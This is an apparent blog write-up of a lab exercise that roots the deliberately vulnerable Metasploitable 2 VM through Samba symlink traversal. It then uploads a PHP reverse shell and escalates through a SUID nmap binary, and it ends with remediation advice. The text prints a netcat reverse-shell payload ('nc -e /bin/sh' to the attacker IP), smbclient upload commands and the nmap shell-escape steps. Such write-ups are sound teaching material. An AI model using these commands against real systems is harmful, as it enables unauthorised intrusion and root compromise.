---
author: Samuel Marques
pubDatetime: 2026-03-24
modDatetime: 2026-03-24
title: "Write-up: Metasploitable 2 | Samba"
ogImage: "Write-up: Metasploitable 2 | Samba"
slug: metasploitable-2-samba
featured: false
draft: true
tags:
  - exploit
  - ctf
  - vulnerable vm
  - easy
description: Exploiting a vulnerable Samba service on Metasploitable 2.
  Metasploitable 2 is a deliberately vulnerable virtual machine designed for
  practicing penetration testing. It contains outdated software and
  misconfigurations that make it ideal for learning exploitation techniques.
---
Check the previous Metasploitable 2 write-up here, covering VSFTPD exploitation: [Write-up: Metasploitable 2 | VSFTPD | Samuel M..](https://www.samuelmarques.dev/posts/metasploitable-2-vsftpd/)

[Metasploitable 2](https://sourceforge.net/projects/metasploitable/) is a deliberately vulnerable virtual machine developed by Rapid7 to serve as a safe environment for practicing penetration testing and ethical hacking techniques. Unlike production systems, it is intentionally misconfigured and filled with outdated software, insecure services, and exploitable flaws. This makes it an ideal platform for students and professionals to understand how real-world attacks unfold without the risk of harming live systems.

**Objective:** While Metasploitable 2 contains dozens of vulnerabilities, this write-up focuses exclusively on the exploitation of the **Samba** service. The goal is to demonstrate how a series of minor infrastructure misconfigurations, specifically in the **Samba** service and **Linux filesystem permissions**, can be chained together to achieve full root access. Unlike the previous VSFTPD exploit which relied on a software backdoor, this attack exploits "logical" flaws and insecure administrative choices.


| Tool | Purpose |
| ------------ | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| Nmap | Scanning open ports and services, and elevating privileges |
| Searchsploit | Searching for exploits for given services |
| smbclient | Accessing and interacting with Samba services |
| Metasploit | Exploiting [CVE-2010-0926](https://nvd.nist.gov/vuln/detail/CVE-2010-0926) and [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447) |
| enum4linux | Enumerating information from Samba systems |


## Environment and Goal

To ensure a realistic and controlled penetration testing scenario, the lab was deployed as a cyber range with multiple network segments and a firewall separating the attacker and target machines. This design simulates enterprise environments where internal systems are isolated and protected by perimeter defenses.

- Attacker Machine:
  - Distribution: Kali Linux 2026.1
  - IP Address: `10.0.2.2` 
  - Purpose: Used as the penetration testing platform, equipped with tools such as Nmap, Metasploit Framework, and other utilities for reconnaissance and exploitation.
- Target Machine:
  - Distribution: Metasploitable 2 (Ubuntu-based vulnerable VM)
  - IP Address: `10.6.6.13`
  - Purpose: An intentionally vulnerable system designed for practicing exploitation techniques.

## Reconnaissance

The first step in any engagement is to map the attack surface. Using **Nmap**, a comprehensive service scan was performed to identify open ports, versions, and potential vulnerabilities.

```
nmap -sC -sV -T4 -oA initial_scan 10.6.6.13
```

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan revealed over 20 open ports, ranging from standard web services to legacy Unix "r-services". Port 21 was already covered in [Write-up: Metasploitable 2 | VSFTPD | Samuel M.](https://www.samuelmarques.dev/posts/metasploitable-2-vsftpd/). However, the focus of this engagement shifted to the SMB services running on **Ports 139** and **445**. An Nmap enumeration script confirmed that the target is running **Samba 3.0.20-Debian**.

```
nmap -p139,445 --script smb-os-discovery 10.6.6.13
```

```
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2026-03-24T20:18:38-04:00
```

Using enumeration tools, we identified that the `/tmp` share was configured with **Anonymous READ/WRITE** access. This "open window" served as our entry point into the system's internal architecture.

```
[+] IP: 10.6.6.13:445   Name: 10.6.6.13           Status: Authenticated
    Disk                                          Permissions     Comment
    ----                                          -----------     -------
    print$                                        NO ACCESS       Printer Drivers
    tmp                                           READ, WRITE     oh noes!
    ./tmp       
    dr--r--r--      0 Tue Mar 24 20:50:05 2026    .
    dw--w--w--      0 Sun May 20 15:36:11 2012    ..
    dr--r--r--      0 Tue Mar 24 18:46:52 2026    .ICE-unix
    fw--w--w--      0 Tue Mar 24 18:47:22 2026    4514.jsvc_up
    dr--r--r--      0 Tue Mar 24 18:47:19 2026    .X11-unix
    fw--w--w--     11 Tue Mar 24 18:47:19 2026    .X0-lock
    opt                                           NO ACCESS
    IPC$                                          NO ACCESS
    ADMIN$                                        NO ACCESS
```

### Vulnerability Analysis

The primary vulnerability exploited here is **[CVE-2010-0926](https://nvd.nist.gov/vuln/detail/CVE-2010-0926)**, a symlink traversal flaw in Samba. This occurs when the service is configured to follow Unix symbolic links to files outside of the shared directory. By creating a link that points to the system root (`/`), an attacker can "escape" the restricted share and browse the entire underlying Linux filesystem.

![Captura de tela 2026-03-24 213430.png](</Captura de tela 2026-03-24 213430.png>)

While our primary attack path focused on the logical flaw of symlink traversal, it is worth noting that **Samba 3.0.20** is also famously vulnerable to a remote code execution (RCE) flaw, [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447). This vulnerability exists in the way Samba handles the `username map script` configuration option.

- **The Flaw:** The service fails to properly sanitize shell metacharacters in the username field.
- **The Payload:** An attacker can provide a username containing shell commands wrapped in backticks (e.g., `nohup nc -e /bin/sh 10.0.2.2 4444`).
- **The Result:** Because the script runs with root privileges, the injected command is executed by the system shell immediately upon the login attempt, granting an instant root shell.

![Captura de tela 2026-03-24 212058.png](</Captura de tela 2026-03-24 212058.png>)

While highly effective, relying on a "one-shot" RCE doesn't provide the same level of insight into **post-exploitation**, **lateral movement**, and **privilege escalation** that a multi-stage chain offers. It's not fun.

## Exploitation

![Captura de tela 2026-03-24 215041.png](</Captura de tela 2026-03-24 215041.png>)

Using the Metasploit framework's `linux/samba/symlink_traversal` module, we established a symbolic link named `rootfs` within the `/tmp` share.

This effectively turned the `/tmp` share into a door for the entire hard drive. While we could now read sensitive files like `/etc/passwd`, the underlying **POSIX permissions** still prevented us from writing directly to protected system directories like `/etc/cron.hourly`, or anything in `/etc`.

### A "Dead End"

In a perfect world, my first instinct after gaining file system access via the Samba symlink was to go for the "Golden Ticket": **Remote Code Execution (RCE)** via **Cron**.

Since the symlink allowed me to browse `/etc/cron.hourly`, my plan was simple: upload a reverse shell script into that folder and wait for the system to execute it as **root**. I could read the `crontab` file, see the scheduled tasks, and even list the contents of the cron directories.

![Captura de tela 2026-03-24 221644.png](</Captura de tela 2026-03-24 221644.png>)

### Reality Check

However, I hit a hard wall. While the Samba exploit let me *see* the entire hard drive, it didn't magically grant me root permissions. The OS was still enforcing its own rules. The `/etc/` directory is owned by `root`, and my Samba session (running as a lower-privileged user) didn't have "Write" permissions.

Every attempt to `put` a script into a cron folder resulted in a frustrating `NT_STATUS_ACCESS_DENIED`.

### The Pivot

This failure was a crucial lesson. I had to stop looking for "system" vulnerabilities and start looking for "application" vulnerabilities. I realized that if I couldn't write to the **Operating System** folders, I should check the **Web Server** folders.

Web servers often have much looser permissions to allow for file uploads or CMS updates. By shifting my focus from `/etc` to `/var/www`, I found the writable `/dav` directory. This pivot is what eventually led to my initial foothold as `www-data`. It wasn't the "root shell" I wanted immediately, but it was the "reverse shell" I needed to start exploring the system from the inside.

```
smb: \> cd rootfs/var/www/dav
smb: \> put reverse_shell.php
```

![](</Captura de tela 2026-03-24 224641.png>)

As you can see, I also tried to write on other directories inside `/var/www`. No success.

By triggering `shell.php` via a browser, we received a connection back to our Kali machine, granting us a shell as the **www-data** user.

## Post-Exploitation

Gaining access as `www-data` provided a foothold, but the account was heavily restricted. To achieve root, we performed a local audit for **SUID (Set User ID)** binaries:

```
find / -perm -4000 -type f 2>/dev/null
```

![Captura de tela 2026-03-24 225737.png](</Captura de tela 2026-03-24 225737.png>)

The search identified `/usr/bin/nmap` with the SUID bit set. In this case, Nmap's "Interactive Mode" can be used to execute shell commands with the privileges of the file owner (root), based on [nmap | GTFOBins](https://gtfobins.org/gtfobins/nmap/#shell).

```
sh-3.2$ nmap --interactive

nmap> !sh
```

![Captura de tela 2026-03-24 230704.png](</Captura de tela 2026-03-24 230704.png>)

![Captura de tela 2026-03-24 230713.png](</Captura de tela 2026-03-24 230713.png>)

Running the `id` command showed an **Effective User ID (euid=0)**, confirming we had successfully escalated to root privileges.

## Lessons Learned and Conclusion

The exploitation of Metasploitable 2 via Samba demonstrates that **Infrastructure Flaws** are just as dangerous as software bugs.

"Root" is, rarely, the end of an attack; it is the beginning of total system control. By chaining a symlink traversal with a misconfigured web directory and a dangerous SUID binary, we moved from an anonymous network observer to a system administrator. This proves that internal network blocks and "localhost-only" restrictions are easily circumvented once an OS-level foothold is established.

### Remediation

To secure this system, the administrator would need to disable symlink following by setting `wide links = no` in the `[global]` section of `smbd.conf`. They would need to audit SUID binaries and remove the bit from any application that allows shell escapes (e.g., [at | GTFOBins](https://gtfobins.org/gtfobins/at/)).

&nbsp;